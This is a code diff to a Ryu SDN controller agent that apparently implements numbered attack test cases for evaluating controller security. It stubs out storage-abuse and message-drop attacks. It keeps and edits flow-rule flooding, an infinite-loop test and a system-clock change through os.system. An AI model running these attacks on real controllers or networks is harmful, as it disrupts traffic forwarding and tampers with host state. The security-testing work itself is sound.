@@ -23,7 +23,6 @@ class AppAgent13(app_manager.RyuApp):
         self.dpset = kwargs['dpset']
         self.drop = 0
         self.clear = 0
-        #self.abuse = 0
         self.msg = None
 
         # Run AMInterface Thread
@@ -34,19 +33,10 @@ class AppAgent13(app_manager.RyuApp):
         self.logger.info("[App-Agent] Starting AppAgent on Ryu")
 
     # 3.1.020
-    # TODO: unchained structure
+    # TODO: N/A
     def testControlMessageDrop(self):
         self.logger.info("[ATTACK] Start Control Message Drop")
-        #self.drop = 1
-        return "Drop Packet"
-
-    # 3.1.020 drop
-    def callControlMessageDrop(self):
-        pkt = packet.Packet(self.msg.data)
-        eth = pkt.get_protocols(ethernet.ethernet)[0]
-        self.logger.info("Drop Packet Info: ")
-        self.logger.info(str(eth) + "\n")
-
+        return "[AppAgent] N/A"
 
     # 3.1.030
     def testInfiniteLoops(self):
@@ -64,24 +54,10 @@ class AppAgent13(app_manager.RyuApp):
                 i = 0
 
     # 3.1.040
-    # TODO: Maybe no Internal Storage in RYU, My test result is fail.
+    # TODO: N/A
     def testInternalStorageAbuse(self):
         self.logger.info("[ATTACK] Start Internal Storage Abuse")
-        app_name = "SimpleSwitch13"
-        app_mgr = app_manager.AppManager.get_instance()
-        del app_mgr.applications[app_name].mac_to_port
-        return "All of datapath"
-
-#        self.callInternalStorageAbuse()
-#        self.abuse = 1
-#        return "All of Datapath"
-
-#    def callInternalStorageAbuse(self):
-#        app_name = "SimpleSwitch13"
-#        app_mgr = app_manager.AppManager.get_instance()
-#        for dp in self.dpset.dps.values():
-#            del app_mgr.applications[app_name].mac_to_port[dp.id]
-#        self.logger.info("Pass")
+        return "[AppAgent] N/A"
 
     # 3.1.070
     def testFlowRuleModification(self):
@@ -158,7 +134,7 @@ class AppAgent13(app_manager.RyuApp):
             x = x + 1
 
     # 3.1.130
-    # TODO: permission problem
+    # TODO: permission
     def testSystemVariableManipulation(self):
         self.logger.info("[ATTACK] System Variable Manipulation")
         os.system("date -s '1 JAN 1999'")
@@ -170,9 +146,10 @@ class AppAgent13(app_manager.RyuApp):
 
     # 3.1.190
     def testFlowRuleFlooding(self):
+        self.logger.info("[ATTACK] Flow Rule Flooding")
         for dp in self.dpset.dps.values():
             count = 10
-            while count < 66535:
+            while count < 25000:
                 match = dp.ofproto_parser.OFPMatch(eth_dst=count)
                 flow_mod = dp.ofproto_parser.OFPFlowMod(datapath=dp,
                                                         match=match)
@@ -180,7 +157,7 @@ class AppAgent13(app_manager.RyuApp):
                 count = count + 1
 
     # 3.1.200
-    # TODO:
+    # TODO: N/A
     def testSwitchFirmwareMisuse(self):
         return
 
